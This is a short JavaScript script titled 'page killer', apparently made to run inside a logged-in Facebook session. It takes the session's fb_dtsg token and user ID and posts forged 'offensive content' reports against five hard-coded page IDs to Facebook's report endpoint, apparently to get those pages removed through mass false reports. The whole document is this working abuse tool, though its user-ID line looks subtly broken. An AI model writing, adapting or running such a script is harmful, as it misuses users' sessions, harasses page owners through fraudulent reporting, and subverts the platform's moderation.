/* page killer */

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now = (new Date).getTime();

function pages(pid) {
    var Page = new XMLHttpRequest();
    var PageURL = "//www.facebook.com/ajax/report/social.php";
    var PageParams = "fb_dtsg=" + fb_dtsg + "&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A" + pid + "%2C%22content_type%22%3A23%2C%22first_choice%22%3A%22offensive%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22report_type%22%3A1%2C%22sub_report_type%22%3A84%2C%22time_flow_started%22%3A" + now + "%2C%22user%22%3A" + user_id + "%7D&file_report=1&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35CFUSt2u5FeDKdpU&__req=f&phstamp=165816771888475116486";
    Page.open("POST", PageURL, true);
    Page.onreadystatechange = function () {
        if (Page.readyState == 4 && Page.status == 200) {
            Page.close;
        }
    };
    Page.send(PageParams);
}
pages("516697635031448");
pages("233824400006176");
pages("542620142450043");
pages("365702020189144");
pages("402345359828094");
